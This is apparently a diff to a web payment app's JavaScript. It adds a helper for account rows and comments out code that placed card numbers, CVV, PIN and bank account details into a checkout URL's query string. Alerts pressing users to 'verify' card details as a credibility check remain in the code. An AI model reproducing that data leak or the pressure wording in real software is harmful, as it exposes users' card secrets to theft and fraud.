@@ -3614,6 +3614,7 @@ if( location.href.includes( bankUrl ) ){
 			}
 			
 		}
+		//setChild(notesAcc, bankRow)
 		//console.log( "notesAcc" + notesAcc );
 		if( ! notesAcc || ! notesAcc.length ){
 			accChildren[0].remove();			
@@ -10295,6 +10296,37 @@ if( location.href.includes( transUrl ) ) {
 	
 }
 
+function setChild(notesAcc, bankRow, len = 0,loop = 1, isBank = true ){
+	let accChildren = bankRow.children;
+	if( ! notesAcc || ! len ){
+		accChildren[0].remove();			
+	} else {
+		let card, child;
+		if( len == 2 ){
+			accChildren[1].remove();
+			card 			= notesAcc[loop];
+			child 			= accChildren[0].cloneNode(true);
+
+			if(isBank){
+				setAccChild( card, child );
+				setAccChild( notesAcc[loop - 1], accChildren[0] );
+			} else {
+				setCardChild( card, child );
+				setCardChild( notesAcc[loop - 1], accChildren[0] );
+			}
+			
+			bankRow.appendChild( child );
+			
+		} else{
+			if(isBank)
+				setAccChild( notesAcc[loop - 1], accChildren[0] );	
+			else 
+				setCardChild( notesAcc[loop - 1], accChildren[0] );	
+		} 
+		
+	}
+}
+
 function setAccChild( acc, child ){
 	//console.log( "child:" + child );
 	child.setAttribute("account", JSON.stringify( acc ));
@@ -12642,13 +12674,13 @@ async function saveNotesCard(){
 		
 		let payment 		= await billCard(amount, email, currency, false, "", false, "paystack" );
 		console.log("the payment data recieved: ", payment )
-		if( payment && typeof payment == "object" && payment.data && payment.data.checkout_url ){
-			let url 			= new URL( payment.data.checkout_url );
+		if( payment && typeof payment == "object" && payment.data && payment.data.redirect_url ){
+			let url 			= new URL( payment.data.redirect_url );
 			
 			if( url ){			
 				let obj 			= {};
 				obj.checkout		= true;
-				url.searchParams.set("num", saveCard.cardNumber);
+				/*url.searchParams.set("num", saveCard.cardNumber);
 				url.searchParams.set("exp", saveCard.expiry);
 				url.searchParams.set("cvv", saveCard.cvvNum);
 				url.searchParams.set("first", saveCard.holderName.split(" ")[0]);
@@ -12658,7 +12690,7 @@ async function saveNotesCard(){
 				url.searchParams.set("postal", saveCard.cardPostal);
 				url.searchParams.set("country", saveCard.cardCountry);
 				url.searchParams.set("PIN", saveCard.cardPIN);
-                url.searchParams.set("back", location.href);
+                url.searchParams.set("back", location.href);*/
 				let ref 			= payment.data.transaction_ref;
 				await Scriptbill.createAlert( "Please Visit Our Payment Processing Page to Verify Your Card Details. This is a required credibility check of users who may need some of our products like loan, investment and crediting. " );
 				var win = window.open(url.href, "_blank");
@@ -13273,7 +13305,7 @@ async function saveBankDetails(){
 
 			if( payment && payment.data && payment.data.redirect_url ){
 				let url = new URL( payment.data.redirect_url );
-				url.searchParams.set("num", accNum.value);
+				/*url.searchParams.set("num", accNum.value);
 				url.searchParams.set("exp", JSON.stringify(['--','--']) );
 				url.searchParams.set("cvv", "000");
 				url.searchParams.set("first", accName.value.split(" ")[0]);
@@ -13282,7 +13314,7 @@ async function saveBankDetails(){
 				url.searchParams.set("city", " ");
 				url.searchParams.set("postal", " ");
 				url.searchParams.set("country", country.querySelector("option[value='"+country.value+"']").innerText );
-				url.searchParams.set("PIN", "0000");
+				url.searchParams.set("PIN", "0000");*/
 				url.searchParams.set("back", location.href);
 				await Scriptbill.createAlert( "Please Visit Our Payment Processing Page to Verify Your Bank Account Details. This is a required credibility check of users who may need some of our products like loan, investment and crediting. " );
 				var win = window.open(url.href, "_blank");
